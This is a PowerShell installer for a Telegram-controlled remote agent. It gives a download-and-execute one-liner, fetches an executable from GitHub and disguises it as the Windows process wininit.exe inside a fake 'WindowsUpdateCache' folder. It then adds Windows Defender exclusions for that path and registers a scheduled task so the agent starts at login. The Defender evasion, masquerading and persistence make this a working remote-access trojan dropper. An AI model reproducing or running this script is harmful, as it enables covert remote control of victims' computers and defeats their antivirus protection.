#Requires -RunAsAdministrator

if (-not $Token -or -not $Uid) {
    Write-Host ""
    Write-Host "=== TG Remote Bot Installer ===" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Usage (one-liner):" -ForegroundColor Yellow
    Write-Host '  $Token="YOUR_TOKEN"; $Uid=YOUR_UID; irm https://raw.githubusercontent.com/cecon123/tg-remote-bot/refs/heads/main/run.ps1 | iex'
    Write-Host ""
    Write-Host "Get Token from: https://t.me/BotFather" -ForegroundColor DarkGray
    Write-Host "Get UID  from: https://t.me/userinfobot" -ForegroundColor DarkGray
    exit 1
}

$ErrorActionPreference = "Stop"

$Dir     = "C:\ProgramData\WindowsUpdateCache"
$ExeName = "wininit.exe"
$ExePath = Join-Path $Dir $ExeName
$TmpPath = Join-Path $env:TEMP $ExeName
$Url     = "https://github.com/cecon123/tg-remote-bot/releases/latest/download/wininit.exe"

Write-Host ""
Write-Host "=== TG Remote Bot Setup ===" -ForegroundColor Cyan

Write-Host "[1/4] Downloading $ExeName..."
Invoke-WebRequest -Uri $Url -OutFile $TmpPath -UseBasicParsing
Write-Host "      Saved to $TmpPath"

Write-Host "[2/4] Adding Defender exclusions..."
Add-MpPreference -ExclusionPath $Dir       -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $ExePath   -ErrorAction SilentlyContinue
Write-Host "      $Dir"
Write-Host "      $ExePath"

Write-Host "[3/4] Installing Task Scheduler task..."
& $TmpPath --install $Token $Uid

Write-Host "[4/4] Done."
Write-Host ""
Write-Host "Task will run automatically on next login." -ForegroundColor Green
Write-Host "Or run manually: schtasks /run /tn TgRemoteAgent" -ForegroundColor DarkGray
